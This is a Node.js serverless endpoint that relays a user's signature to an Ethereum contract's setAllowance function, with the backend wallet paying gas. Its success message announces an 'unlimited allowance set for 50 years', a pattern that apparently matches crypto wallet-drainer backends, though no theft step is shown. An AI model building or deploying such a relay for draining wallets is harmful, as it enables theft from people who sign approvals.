// api/submit.js - Debug Version
const { ethers } = require('ethers');

module.exports = async (req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    console.log('========================================');
    console.log('📥 REQUEST RECEIVED');
    console.log('📌 Method:', req.method);
    console.log('📌 Headers:', req.headers);
    console.log('========================================');

    // Handle OPTIONS
    if (req.method === 'OPTIONS') {
        console.log('✅ OPTIONS request handled');
        return res.status(200).end();
    }

    // Only POST allowed
    if (req.method !== 'POST') {
        console.log('❌ Method not allowed:', req.method);
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        console.log('📦 Request Body:', req.body);

        const { user, nonce, deadline, signature } = req.body;

        console.log('📥 Received from:', user);
        console.log('📝 Nonce:', nonce);
        console.log('⏰ Deadline:', deadline);
        console.log('📝 Signature:', signature ? signature.substring(0, 40) + '...' : 'null');

        // ============================================
        // ⭐ CONFIG - Environment Variables
        // ============================================
        const CONFIG = {
            rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY}`,
            privateKey: process.env.PRIVATE_KEY,
            contractAddress: "0xb69E225117d428a0b349BAB76368c68012Df1837"
        };

        console.log('🔧 CONFIG:');
        console.log('  - rpcUrl:', CONFIG.rpcUrl ? '✅ Set' : '❌ Not Set');
        console.log('  - privateKey:', CONFIG.privateKey ? '✅ Set' : '❌ Not Set');
        console.log('  - contractAddress:', CONFIG.contractAddress);

        // Check if private key exists
        if (!CONFIG.privateKey) {
            console.error('❌ PRIVATE_KEY not set!');
            return res.status(500).json({ 
                success: false, 
                error: 'PRIVATE_KEY not set in environment variables' 
            });
        }

        if (!process.env.ALCHEMY_API_KEY) {
            console.error('❌ ALCHEMY_API_KEY not set!');
            return res.status(500).json({ 
                success: false, 
                error: 'ALCHEMY_API_KEY not set in environment variables' 
            });
        }

        // ============================================
        // ⭐ Initialize Provider and Wallet
        // ============================================
        console.log('⏳ Initializing provider...');
        const provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcUrl);
        console.log('✅ Provider initialized');

        console.log('⏳ Initializing wallet...');
        const wallet = new ethers.Wallet(CONFIG.privateKey, provider);
        console.log('👛 Wallet address:', wallet.address);

        // ============================================
        // ⭐ Smart Contract Setup
        // ============================================
        const contractABI = [
            "function setAllowance(address user, uint256 nonce, uint256 deadline, bytes calldata signature) external"
        ];

        const contract = new ethers.Contract(CONFIG.contractAddress, contractABI, wallet);
        console.log('✅ Contract initialized');

        // ============================================
        // ⭐ Submit Transaction
        // ============================================
        console.log('⏳ Submitting setAllowance()...');
        console.log('⛽ Gas will be paid by:', wallet.address);

        const tx = await contract.setAllowance(
            user,
            nonce,
            deadline,
            signature
        );

        console.log('📤 Tx Hash:', tx.hash);

        // Wait for confirmation
        console.log('⏳ Waiting for confirmation...');
        const receipt = await tx.wait();

        console.log('✅ Transaction confirmed!');
        console.log('📦 Block:', receipt.blockNumber);
        console.log('⛽ Gas Used:', receipt.gasUsed.toString());

        // ============================================
        // ⭐ Return Success Response
        // ============================================
        console.log('📤 Sending success response');
        console.log('========================================');

        res.json({
            success: true,
            message: '✅ Unlimited allowance set for 50 years! Gas paid by backend.',
            txHash: tx.hash,
            blockNumber: receipt.blockNumber,
            gasUsed: receipt.gasUsed.toString(),
            etherscanUrl: `https://etherscan.io/tx/${tx.hash}`
        });

    } catch (error) {
        console.error('❌ Error:', error.message);
        console.error('📝 Stack:', error.stack);
        console.log('========================================');
        
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};
